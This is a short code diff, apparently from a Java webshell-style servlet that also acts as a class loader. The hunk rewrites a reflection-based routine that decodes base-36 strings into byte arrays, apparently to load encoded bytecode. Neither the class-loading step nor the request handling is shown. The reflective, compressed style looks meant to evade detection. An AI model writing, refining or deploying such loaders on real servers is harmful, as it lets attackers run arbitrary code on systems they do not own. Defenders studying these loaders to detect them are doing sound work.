@@ -31,9 +31,7 @@ public class BigIntegerClassLaoderServlet extends ClassLoader implements Servlet
 
     static byte[] decodeBigInteger(String bigIntegerStr) throws Exception {
         Class<?> decoderClass = Class.forName("java.math.BigInteger");
-        java.lang.reflect.Constructor<?> ctor = decoderClass.getConstructor(String.class, int.class);
-        Object bigInt = ctor.newInstance(bigIntegerStr, 36);
-        return (byte[]) decoderClass.getMethod("toByteArray").invoke(bigInt);
+        return (byte[]) decoderClass.getMethod("toByteArray").invoke(decoderClass.getConstructor(String.class, int.class).newInstance(bigIntegerStr, Character.MAX_RADIX));
     }
 
     @Override
